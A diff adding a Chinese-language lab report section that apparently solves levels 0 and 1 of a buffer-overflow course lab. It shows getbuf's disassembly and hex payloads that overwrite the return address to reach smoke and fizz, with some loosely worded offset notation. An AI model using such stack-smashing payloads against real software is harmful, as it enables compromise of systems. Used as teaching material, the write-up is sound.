@@ -643,3 +643,46 @@ bomb21
 ### 实验结果
 
 ![result](./fig/lab2_result.png)
+
+## 实验三
+
+- 反汇编，并定位到 `getbuf` 函数
+
+  ```asm
+  08048fe0 <getbuf>:
+   8048fe0:	55                   	push   %ebp
+   8048fe1:	89 e5                	mov    %esp,%ebp
+   8048fe3:	83 ec 18             	sub    $0x18,%esp
+   8048fe6:	8d 45 f4             	lea    -0xc(%ebp),%eax
+   8048fe9:	89 04 24             	mov    %eax,(%esp)
+   8048fec:	e8 6f fe ff ff       	call   8048e60 <Gets>
+   8048ff1:	b8 01 00 00 00       	mov    $0x1,%eax
+   8048ff6:	c9                   	leave  
+   8048ff7:	c3                   	ret    
+   8048ff8:	90                   	nop
+   8048ff9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
+  ```
+
+- 数组 `buf` 的长度为 `0xc`，因此，地址 `-(0xc + 0x8)%ebp` 存储的是函数返回地址，只需要将该地址修改为想要跳转的函数地址即可
+
+### level0
+
+- 根据反汇编代码，`smoke` 函数的地址为 `0x08048e20`
+
+- 因此，可以将 `buf` 设为：`48 48 48 48 48 48 48 48 48 48 48 48 48 48 48 48 20 8e 04 08 00 00 00 00`
+
+- 结果：
+
+  ![result](./fig/lab3_level0_result.png)
+
+### level1
+
+- `fizz` 函数的地址为 `0x08048dc0`
+
+- 并且我们需要设置参数的值为 `cookie`，由于地址 `-(0xc + 0x8)%ebp` 存储 `%esp` 指针的值，所以参数在地址 `-(0xc + 0x16)%ebp` 传入
+
+- 因此，可以将 `buf` 设为：`48 48 48 48 48 48 48 48 48 48 48 48 48 48 48 48 c0 8d 04 08 00 00 00 00 28 02 3b 42`
+
+- 结果：
+
+  ![result](./fig/lab3_level1_result.png)
